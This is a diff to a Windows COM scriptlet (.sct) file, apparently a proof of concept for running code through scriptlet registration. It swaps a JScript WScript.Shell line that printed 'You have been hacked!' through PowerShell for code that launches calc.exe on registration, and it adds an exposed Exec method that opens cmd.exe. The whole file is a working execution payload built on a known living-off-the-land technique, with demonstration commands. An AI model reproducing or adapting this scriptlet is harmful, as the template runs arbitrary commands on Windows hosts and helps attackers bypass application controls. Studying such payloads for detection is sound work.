@@ -5,11 +5,26 @@ description="test"
 progid="test"
 version="1.00"
 classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
-remotable="true">
+		<![CDATA[
+	
+			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+	
+		]]>
+	</script>
 </registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
 <script language="JScript">
 <![CDATA[
-var r = new ActiveXObject("WScript.Shell").Run("cmd /k powershell -c Write-Host You have been hacked!");
+	
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+	}
+	
 ]]>
 </script>
+
 </scriptlet>
